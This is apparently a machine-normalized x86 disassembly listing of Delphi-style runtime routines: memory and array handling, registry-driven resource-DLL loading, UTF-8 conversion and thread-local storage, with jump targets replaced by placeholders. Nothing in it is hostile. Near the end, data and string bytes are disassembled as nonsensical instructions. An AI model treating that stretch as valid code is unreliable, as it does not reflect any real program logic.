mov eax ebx
mov edx [ esi ]
call sub_403fc0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404688
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404ae0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c14
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404af8
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4055c0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404f38
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404d10
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d64
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404d5c
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c40
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4049e8
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c40
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404d44
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404d64
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404efc
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4049e8
sub_404f38
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404efc
pop edx
pop eax
sub_404f60
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404f90
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4051cc
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404fd8
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404f90
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405014
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405000
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405000
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405000
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4051cc
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405014
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40546c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_4054cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405507
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405538
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4054cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4055a3
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4055c0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4055ec
test edx edx
je sub_4055a8
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405690
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4056b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405794
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4058cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
mov eax ebx
xor edx edx
call sub_4047c4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405972
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_4047b8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045b8
mov eax ebx
call sub_4047b8
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
inc eax
push eax
mov eax ebx
call sub_4047a8
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
pop ecx
pop edx
call sub_4056b8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045b8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
sub_405978
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40464c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a16
lea eax [ ebp - 0x4 ]
call sub_40464c
retn
mov eax ebx
call sub_40422c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404894
mov eax ebx
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047b8
inc eax
push eax
mov eax ebx
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047a8
pop ecx
pop edx
call sub_405794
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40464c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404894
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404688
sub_405a1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404798
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4058cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a66
lea eax [ ebp - 0x4 ]
call sub_40464c
retn
sub_405a6c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404164
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404fd8
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_40405c
jmp r-xdata
sub_405ac4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041dc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c60
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b31
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
xor ebx ebx
sub_405b38
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b89
retn
mov eax rw-data
call sub_402ad8
mov eax rw-data
call sub_402ad8
mov eax rw-data
call sub_402ad8
call sub_401ac0
sub_405b8c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d08
call sub_40306c
test al al
je r-xdata
call sub_403160
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40309c
call sub_40127c
call sub_405ac4
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405ac4
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405c94
push ebx
call sub_405c8c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405c80
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f60
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f60
sub_405cd8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405c94
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405d24
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405c60
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405d18
mov edx rw-data
mov eax ebx
call sub_403cb4
pop ebx
retn
sub_405d68
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d94
retn
sub_405dc4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405de0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e0c
retn
sub_405e18
sbb al 0x5e
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
sbb [ esi + 0x40 ] bl
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
and al [ esi ]
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
add [ ebx - 0x3da0040 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
hlt
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esi
add [ ebx - 0x17da0040 ] cl
and al [ esi ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x425ffc0 ] cl
and eax [ esi ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:CreateEventA) ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
int3
je r-xdata
mov eax eax
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
add ebx [ eax ]
pop esi
inc eax
add [ ebx + 0x825ffc0 ] cl
and al [ esi ]
mov eax eax
jmp [ RegOpenKeyExA@IAT ]
sub_406894
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
